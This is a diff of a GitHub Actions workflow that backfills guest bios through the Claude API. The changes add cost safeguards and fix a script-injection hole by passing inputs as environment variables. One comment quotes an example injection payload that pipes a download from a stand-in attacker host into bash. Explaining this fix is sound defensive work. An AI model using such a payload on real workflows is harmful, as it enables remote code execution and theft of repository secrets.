@@ -14,7 +14,15 @@ name: Backfill Full Bios
 # is safe: if the job times out, gets cancelled, or a chunk errors out, only
 # that in-flight chunk is lost — everything before it is already on `main`.
 # Re-running (with any limit) only ever picks up guests still missing a bio
-# entirely, so nothing gets reprocessed or re-charged for.
+# entirely, so nothing gets reprocessed or re-charged for — enforced via
+# --new-only (a real cost-review finding: without it, the pipeline's own
+# 30-day staleness TTL would silently re-qualify the ENTIRE archive for
+# re-enrichment once this backfill finishes and 30 days pass, since
+# "enrichedAt > 30 days ago" doesn't distinguish "never enriched" from
+# "enriched by this exact backfill a month ago"). weekly-ingest.yml's own
+# enrich-bios.ts invocation is untouched and keeps that staleness-refresh
+# behavior — this flag is scoped to this workflow specifically, where
+# re-spending on the whole archive was the real, unbounded risk.
 
 on:
   workflow_dispatch:
@@ -57,14 +65,44 @@ jobs:
       - name: Enrich bios in chunks, committing progress after each
         env:
           ANTHROPIC_API_KEY: ${{ secrets.ANTHROPIC_API_KEY }}
+          # Passed as real env vars, not interpolated via ${{ }} into the
+          # script body — GitHub substitutes ${{ }} as literal text into the
+          # run: script BEFORE bash executes it, so a crafted workflow_dispatch
+          # input (e.g. limit or model containing `"; curl evil.example | bash;`)
+          # would execute as arbitrary shell in a runner that holds
+          # contents:write and ANTHROPIC_API_KEY — a textbook GitHub Actions
+          # script-injection pattern. env: values are passed as real process
+          # environment variables and referenced via $VARNAME, which bash
+          # treats as data, never as script text. workflow_dispatch inputs can
+          # only come from someone with write access to this repo (not an
+          # arbitrary public PR), but the fix costs nothing and removes the
+          # class entirely.
+          INPUT_LIMIT: ${{ github.event.inputs.limit }}
+          INPUT_MODEL: ${{ github.event.inputs.model }}
         run: |
           git config user.name "github-actions[bot]"
           git config user.email "github-actions[bot]@users.noreply.github.com"
 
           CHUNK=50
-          TOTAL="${{ github.event.inputs.limit }}"
-          MODEL="${{ github.event.inputs.model }}"
+          TOTAL="$INPUT_LIMIT"
+          MODEL="$INPUT_MODEL"
           DONE=0
+          # Each chunk spawns a FRESH `npx tsx` process, so enrich-bios.ts's
+          # own Claude credential smoke-test would otherwise re-verify on
+          # every single chunk — up to ~58 times across the full ~2,900-guest
+          # backlog at 50/chunk, each one a real network round-trip that adds
+          # up to real time even though its dollar cost is trivial. Verify
+          # once (the first chunk), then tell every later chunk to skip its
+          # own check. A credential that breaks mid-run (not just at chunk 1)
+          # is still caught: an independent review found that skipping the
+          # smoke test alone would let a mid-run break silently zero out a
+          # whole chunk's bios.json changes, which this loop's own "no
+          # changes staged = backlog exhausted" check would then
+          # misinterpret as a clean, finished run. enrich-bios.ts now exits
+          # non-zero when every guest in a Claude-enabled chunk fails
+          # outright, which aborts this whole job loudly under bash -e
+          # instead of looking like a successful stop.
+          SKIP_SMOKE_TEST=""
 
           while [ "$DONE" -lt "$TOTAL" ]; do
             REMAINING=$((TOTAL - DONE))
@@ -73,13 +111,25 @@ jobs:
             echo "=== Chunk: $THIS_CHUNK guests (done so far: $DONE/$TOTAL) ==="
             if [ -n "$MODEL" ]; then
               echo "=== Using model override: $MODEL ==="
-              npx tsx scripts/ingest/enrich-bios.ts --limit "$THIS_CHUNK" --model "$MODEL"
+              SKIP_CLAUDE_SMOKE_TEST="$SKIP_SMOKE_TEST" npx tsx scripts/ingest/enrich-bios.ts --new-only --concurrency 4 --limit "$THIS_CHUNK" --model "$MODEL"
             else
-              npx tsx scripts/ingest/enrich-bios.ts --limit "$THIS_CHUNK"
+              SKIP_CLAUDE_SMOKE_TEST="$SKIP_SMOKE_TEST" npx tsx scripts/ingest/enrich-bios.ts --new-only --concurrency 4 --limit "$THIS_CHUNK"
             fi
+            SKIP_SMOKE_TEST="1"
             npx tsx scripts/ingest/patch-bios-into-guests.ts
 
+            # Ask the Registry's Q&A endpoint (api/ask.py) reads
+            # api/guests_context.json, not data/guests.json directly — only
+            # weekly-ingest.yml regenerated it, on its own Monday schedule.
+            # Real gap this pass found: 4 guests already had a correct bio
+            # in data/guests.json but were still invisible to the live Q&A
+            # feature, because the context snapshot predated their fix.
+            # Regenerating it every chunk keeps new/corrected bios queryable
+            # within the same run instead of waiting up to a week.
+            npx tsx scripts/emit_context.ts
+
             git add data/guests.json
+            git add api/guests_context.json
             git add -f scripts/cache/bios.json
             if git diff --staged --quiet; then
               echo "No changes this chunk — backlog is exhausted, stopping early."
